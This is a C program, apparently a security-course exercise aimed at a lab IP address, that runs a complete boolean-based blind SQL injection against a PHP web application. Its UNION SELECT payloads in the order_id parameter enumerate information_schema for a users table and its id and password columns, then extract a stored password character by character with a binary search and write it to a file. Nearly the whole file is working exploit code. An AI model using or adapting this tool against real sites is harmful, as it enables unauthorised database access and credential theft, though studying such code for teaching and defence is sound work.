/**
 * Blind SQL Injection Attack
 *
 * This program performs a boolean-based blind SQL injection attack against
 * a vulnerable PHP web application to extract a password from the database.
 *
 * Compile: gcc -Wall -Wextra -Werror -Wconversion ex4_sqli.c -o ex4_sqli
 * Run: ./ex4_sqli
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

/* Configuration */
#define WEB_APP_IP "192.168.1.202"
#define WEB_APP_PORT 80
#define DATABASE_NAME "67607db"
#define SUBMITTER_ID "324807346"

#define MAX_QUERY_LEN 2048
#define MAX_RESPONSE_LEN 8192
#define MAX_NAME_LEN 11
#define MAX_PASSWORD_LEN 11

/* Printable ASCII range (0x20 to 0x7E) */
#define ASCII_MIN 32
#define ASCII_MAX 126

/**
 * URL-encode a string for use in HTTP GET requests
 */
static void url_encode(const char *src, char *dst, size_t dst_size) {
  size_t j = 0;
  for (size_t i = 0; src[i] != '\0' && j < dst_size - 4; i++) {
    unsigned char c = (unsigned char)src[i];
    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
        (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' ||
        c == '~') {
      dst[j++] = (char)c;
    } else {
      int written = snprintf(dst + j, dst_size - j, "%%%02X", c);
      if (written > 0) {
        j += (size_t)written;
      }
    }
  }
  dst[j] = '\0';
}

/**
 * Create a socket and connect to the web application
 */
static int connect_to_server(void) {
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    perror("socket creation failed");
    return -1;
  }

  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(WEB_APP_PORT);

  if (inet_pton(AF_INET, WEB_APP_IP, &server_addr.sin_addr) <= 0) {
    perror("invalid address");
    close(sockfd);
    return -1;
  }

  if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) <
      0) {
    perror("connection failed");
    close(sockfd);
    return -1;
  }

  return sockfd;
}

/**
 * Send HTTP GET request and receive response
 * Returns 1 if TRUE condition, 0 if FALSE condition, -1 on error
 */
static int send_request(const char *payload) {
  char encoded_payload[MAX_QUERY_LEN * 3];
  char request[MAX_QUERY_LEN * 4];
  char response[MAX_RESPONSE_LEN];

  url_encode(payload, encoded_payload, sizeof(encoded_payload));

  snprintf(request, sizeof(request),
           "GET /?order_id=%s HTTP/1.1\r\n"
           "Host: %s\r\n"
           "Connection: close\r\n"
           "\r\n",
           encoded_payload, WEB_APP_IP);

  int sockfd = connect_to_server();
  if (sockfd < 0) {
    return -1;
  }

  ssize_t sent = send(sockfd, request, strlen(request), 0);
  if (sent < 0) {
    perror("send failed");
    close(sockfd);
    return -1;
  }

  ssize_t total_received = 0;
  ssize_t received;
  memset(response, 0, sizeof(response));

  while ((received = recv(sockfd, response + total_received,
                          sizeof(response) - (size_t)total_received - 1, 0)) >
         0) {
    total_received += received;
    if ((size_t)total_received >= sizeof(response) - 1)
      break;
  }

  close(sockfd);

  if (strstr(response, "has been sent!") != NULL) {
    return 1;
  } else if (strstr(response, "has not been sent yet") != NULL) {
    return 0;
  }

  return -1;
}

/**
 * Use binary search to find a character at a given position
 */
static int binary_search_char(const char *condition_template, int pos) {
  int low = ASCII_MIN;
  int high = ASCII_MAX;
  char payload[MAX_QUERY_LEN];

  while (low < high) {
    int mid = (low + high) / 2;

    snprintf(payload, sizeof(payload), condition_template, pos, mid);

    int result = send_request(payload);
    if (result < 0) {
      return -1;
    }

    if (result == 1) {
      low = mid + 1;
    } else {
      high = mid;
    }
  }

  if (low >= ASCII_MIN && low <= ASCII_MAX) {
    return low;
  }

  return 0;
}

/**
 * Check if a character exists at a given position
 */
static int char_exists(const char *length_check_template, int pos) {
  char payload[MAX_QUERY_LEN];
  snprintf(payload, sizeof(payload), length_check_template, pos);
  return send_request(payload);
}

/**
 * Extract a string using binary search
 */
static int extract_string(const char *condition_template,
                          const char *length_check_template, char *result,
                          size_t max_len) {
  size_t pos;
  memset(result, 0, max_len);

  for (pos = 0; pos < max_len - 1; pos++) {
    int exists = char_exists(length_check_template, (int)(pos + 1));
    if (exists < 0) {
      return -1;
    }
    if (exists == 0) {
      break;
    }

    int ch = binary_search_char(condition_template, (int)(pos + 1));
    if (ch < 0) {
      return -1;
    }
    if (ch == 0) {
      break;
    }

    result[pos] = (char)ch;
  }

  return (int)pos;
}

/**
 * Discover the table name containing "usr" substring
 */
static int discover_table_name(char *table_name, size_t max_len) {
  const char *condition_template =
      "0 UNION SELECT 1 WHERE (SELECT ASCII(SUBSTRING(table_name,%d,1)) "
      "FROM information_schema.tables "
      "WHERE table_schema='" DATABASE_NAME "' AND table_name LIKE '%%usr%%' "
      "LIMIT 0,1) > %d";

  const char *length_check_template =
      "0 UNION SELECT 1 WHERE (SELECT LENGTH(table_name) "
      "FROM information_schema.tables "
      "WHERE table_schema='" DATABASE_NAME "' AND table_name LIKE '%%usr%%' "
      "LIMIT 0,1) >= %d";

  return extract_string(condition_template, length_check_template, table_name,
                        max_len);
}

/**
 * Discover column name containing a specific substring
 */
static int discover_column_name(const char *table_name, const char *contains,
                                char *column_name, size_t max_len) {
  char condition_template[MAX_QUERY_LEN];
  char length_check_template[MAX_QUERY_LEN];

  snprintf(condition_template, sizeof(condition_template),
           "0 UNION SELECT 1 WHERE (SELECT ASCII(SUBSTRING(column_name,%%d,1)) "
           "FROM information_schema.columns "
           "WHERE table_schema='" DATABASE_NAME "' AND table_name='%s' "
           "AND column_name LIKE '%%%%%s%%%%' "
           "LIMIT 0,1) > %%d",
           table_name, contains);

  snprintf(length_check_template, sizeof(length_check_template),
           "0 UNION SELECT 1 WHERE (SELECT LENGTH(column_name) "
           "FROM information_schema.columns "
           "WHERE table_schema='" DATABASE_NAME "' AND table_name='%s' "
           "AND column_name LIKE '%%%%%s%%%%' "
           "LIMIT 0,1) >= %%d",
           table_name, contains);

  return extract_string(condition_template, length_check_template, column_name,
                        max_len);
}

/**
 * Extract password for the given ID
 */
static int extract_password(const char *table_name, const char *id_column,
                            const char *pwd_column, const char *target_id,
                            char *password, size_t max_len) {
  char condition_template[MAX_QUERY_LEN];
  char length_check_template[MAX_QUERY_LEN];

  snprintf(condition_template, sizeof(condition_template),
           "0 UNION SELECT 1 WHERE (SELECT ASCII(SUBSTRING(%s,%%d,1)) "
           "FROM %s WHERE %s='%s') > %%d",
           pwd_column, table_name, id_column, target_id);

  snprintf(length_check_template, sizeof(length_check_template),
           "0 UNION SELECT 1 WHERE (SELECT LENGTH(%s) "
           "FROM %s WHERE %s='%s') >= %%d",
           pwd_column, table_name, id_column, target_id);

  return extract_string(condition_template, length_check_template, password,
                        max_len);
}

/**
 * Write password to output file
 */
static int write_password_file(const char *submitter_id, const char *password) {
  char filename[64];
  snprintf(filename, sizeof(filename), "%s.txt", submitter_id);

  FILE *fp = fopen(filename, "w");
  if (fp == NULL) {
    perror("Failed to open output file");
    return -1;
  }

  fprintf(fp, "*%s*", password);
  fclose(fp);

  return 0;
}

int main(void) {
  char table_name[MAX_NAME_LEN];
  char id_column[MAX_NAME_LEN];
  char pwd_column[MAX_NAME_LEN];
  char password[MAX_PASSWORD_LEN];

  if (discover_table_name(table_name, sizeof(table_name)) <= 0) {
    fprintf(stderr, "Failed to discover table name\n");
    return 1;
  }

  if (discover_column_name(table_name, "id", id_column, sizeof(id_column)) <=
      0) {
    fprintf(stderr, "Failed to discover ID column name\n");
    return 1;
  }

  if (discover_column_name(table_name, "pwd", pwd_column, sizeof(pwd_column)) <=
      0) {
    fprintf(stderr, "Failed to discover password column name\n");
    return 1;
  }

  if (extract_password(table_name, id_column, pwd_column, SUBMITTER_ID,
                       password, sizeof(password)) <= 0) {
    fprintf(stderr, "Failed to extract password\n");
    return 1;
  }

  if (write_password_file(SUBMITTER_ID, password) < 0) {
    fprintf(stderr, "Failed to write password file\n");
    return 1;
  }

  return 0;
}
